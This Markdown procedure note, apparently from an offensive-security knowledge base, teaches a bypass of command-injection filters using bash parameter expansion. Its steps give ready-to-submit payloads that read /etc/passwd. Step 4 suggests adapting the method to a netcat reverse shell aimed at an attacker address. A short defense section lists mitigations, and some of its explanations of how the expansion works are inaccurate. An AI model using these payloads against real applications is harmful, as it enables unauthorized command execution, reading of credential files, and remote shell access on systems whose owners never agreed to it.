---
type: procedure
description: >-
  Bypass command injection filters using bash variable assignment and parameter
  expansion to execute arbitrary shell commands.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Command-Line Interface]]'
sub_techniques:
  - '[[Unix Shell]]'
tags:
  - command-injection
  - filter-bypass
  - variable-expansion
  - bash
commands: []
platforms:
  - Linux
tools: []
validated: true
---

# Command-Injection-Filter-Bypass-Using-Variable-Expansion

## Summary

This procedure outlines a technique to bypass input filters in command injection vulnerabilities by leveraging bash variable expansion and parameter substitution. By storing an obfuscated command in a variable and using features like ${var//pattern/replacement} to reconstruct the original command at runtime, attackers can evade blacklists that block direct invocations of sensitive commands such as 'cat /etc/passwd'. This is useful in web applications where user input is passed to shell executions without proper sanitization.

## Description

Command injection occurs when untrusted input is directly concatenated into system commands, allowing attackers to append or modify executions. Filters often block common patterns like '/bin/', ';', or specific keywords, but bash's powerful string manipulation can obfuscate payloads. In this method, paths and commands are hidden using repeated characters (e.g., 'hhh/hm' for '/') and wildcards (e.g., '??' for single characters), then normalized via expansion. The example targets reading /etc/passwd, but the approach generalizes to any command. This technique assumes a bash shell on a Linux target and works against naive WAFs or validation rules that don't parse expansions deeply. Success depends on the filter's regex patterns and whether multi-statement injection (via ';') is possible.

## Requirements

1. A vulnerable application with command injection, such as a web form or API endpoint that executes shell commands on user input (e.g., via system(), exec(), or backticks).
2. Network access to the injection point, typically over HTTP/HTTPS.
3. Basic knowledge of bash syntax and the target's file system (e.g., /etc/passwd location).
4. Optional: A proxy like Burp Suite to intercept and modify requests for testing.

## Defense

- Employ whitelisting for allowed inputs rather than blacklisting dangerous patterns; validate against expected formats (e.g., only alphanumeric for filenames).
- Avoid direct shell execution; use language-specific safe functions like escapeshellarg() in PHP or subprocess with lists in Python.
- Implement a WAF with advanced parsing for shell expansions and anomalous patterns; monitor for base64, hex, or repeated characters in inputs.
- Run services under least-privilege accounts without shell access; use containers or SELinux/AppArmor to restrict file reads.
- Log and alert on executions of sensitive commands like 'cat' on system files, and enable shell auditing (e.g., via auditd).

## Objectives

1. Evade input validation to inject and execute arbitrary shell commands.
2. Demonstrate reading sensitive files like /etc/passwd to enumerate users.
3. Establish a foundation for further exploitation, such as chaining to reverse shells.
4. Validate bypass success by observing command output in application responses.

## Instructions

### Step 1: Identify the Injection Point and Test Basic Injection

**Context**: Locate the vulnerable parameter (e.g., a 'command' or 'file' field) and confirm injection by appending a benign separator like ';' followed by 'whoami' or 'id'. This verifies shell execution and filter behaviors. Observe if direct 'cat /etc/passwd' is blocked.

**Instructions**: Submit input like "; id" via the application's form or URL. If successful, note any blocked patterns (e.g., logs or error messages indicating filtered keywords). Use a proxy to capture responses.

**Expected Output**: Response includes output from 'id' (e.g., "uid=33(www-data) gid=33(www-data)"), confirming injection. Direct sensitive commands should fail with filter errors.

**Success Indicators**:
- Arbitrary command output appears in the response.
- No immediate filter blocks on simple tests.

### Step 2: Craft and Inject the Obfuscated Variable Assignment

**Context**: Set up a bash variable with an obfuscated command path to hide it from pattern-matching filters. The variable 'test' stores a mangled version of '/bin/cat /etc/passwd', using placeholders like 'hhh/hm' for '/' and '??' for characters.

**Instructions**: Inject the variable assignment as the first part of the payload, separated by ';'. For example, in a parameter: "; test=/ehhh/hmtc/pahhh/hmsswd". This assigns the obfuscated string without triggering path-based blocks.

**Expected Output**: No visible output from this step alone, but the variable is set in the shell session. Subsequent expansions will use it.

**Success Indicators**:
- No filter rejection on the assignment string.
- Application processes the input without errors.

### Step 3: Inject the Variable Expansion to Reconstruct and Execute the Command

**Context**: Use bash parameter expansion to replace obfuscation patterns in the variable, reconstructing the clean command (e.g., 'cat /etc/passwd'), then pipe to 'cat' for execution and output. This step bypasses filters by avoiding direct suspicious strings.

**Code** ([[codes/Bash-Obfuscated-Command-Injection-Payload-for-Cat-Etc-Passwd]]):

Embed the expansion lines: "; cat ${test//hhh\/hm/}; cat ${test//hh??hm/}". The first expansion replaces 'hhh/hm' with '/', the second handles 'hh??hm' patterns, yielding the executable command.

**Instructions**: Append the expansion to the previous injection, ensuring the full payload is submitted in one request (e.g., "; test=/ehhh/hmtc/pahhh/hmsswd; cat ${test//hhh\/hm/}; cat ${test//hh??hm/}"). Escape slashes in expansions if needed (\/ for literal / in regex). Submit and observe the response.

**Expected Output**: The reconstructed command executes, displaying /etc/passwd contents (e.g., lines like "root:x:0:0:root:/root:/bin/bash").

**Success Indicators**:
- Sensitive file contents appear in the application output.
- No filter blocks on the expansion syntax.

### Step 4: Verify and Iterate

**Context**: Confirm the bypass works and adapt for other commands (e.g., 'whoami' or 'nc -e /bin/sh attacker_ip port'). Test variations if partial blocks occur.

**Instructions**: Replace the 'test' value with obfuscated alternatives for different commands. Re-inject and check for consistent execution.

**Expected Output**: Successful output from varied commands, indicating robust bypass.

**Success Indicators**:
- Multiple commands execute without modification.
- Output matches expected shell behavior.
